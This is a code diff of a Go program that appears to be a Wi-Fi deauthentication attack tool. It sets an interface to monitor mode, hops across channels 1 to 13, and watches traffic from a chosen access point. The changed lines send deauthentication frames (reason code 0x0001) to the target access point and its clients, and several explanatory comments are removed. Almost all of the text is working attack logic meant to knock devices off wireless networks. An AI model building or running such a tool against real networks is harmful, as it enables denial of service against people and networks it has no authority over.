@@ -29,7 +29,6 @@ type Args struct {
 var args Args
 var handle *pcap.Handle
 
-// setupMonitorMode sets the network interface into monitor mode.
 func setupMonitorMode(interfaceName string) {
 	if err := exec.Command("ifconfig", interfaceName, "down").Run(); err != nil {
 		log.Printf("Failed to bring interface down: %v", err)
@@ -46,14 +45,12 @@ func setupMonitorMode(interfaceName string) {
 	fmt.Printf("Monitor mode enabled on %s\n", interfaceName)
 }
 
-// restoreMode restores the network interface to managed mode.
 func restoreMode(interfaceName string) {
 	if err := exec.Command("iwconfig", interfaceName, "mode", "managed").Run(); err != nil {
 		log.Printf("Failed to restore mode: %v", err)
 	}
 }
 
-// channelHop continuously hops between channels.
 func channelHop(interfaceName string) {
 	for {
 		for ch := 1; ch <= 13; ch++ {
@@ -67,7 +64,6 @@ func channelHop(interfaceName string) {
 	}
 }
 
-// capturePackets
 func capturePackets() {
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
@@ -85,16 +81,15 @@ func capturePackets() {
 		if ethernet.SrcMAC.String() == args.targetAP.String() {
 			if args.targetClient != nil {
 				if ethernet.DstMAC.String() == args.targetClient.String() {
-					C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), (*C.u_char)(&args.targetClient[0]))
+					C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), (*C.u_char)(&args.targetClient[0]), C.uint8_t(C.DEAUTH), C.uint16_t(0x0001))
 				}
 			} else {
-				C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), nil)
+				C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), nil, C.uint8_t(C.DEAUTH), C.uint16_t(0x0001))
 			}
 		}
 	}
 }
 
-// scanNetworks
 func scanNetworks() error {
 	cmd := exec.Command("iw", "dev", args.interfaceName, "scan")
 	output, err := cmd.Output()
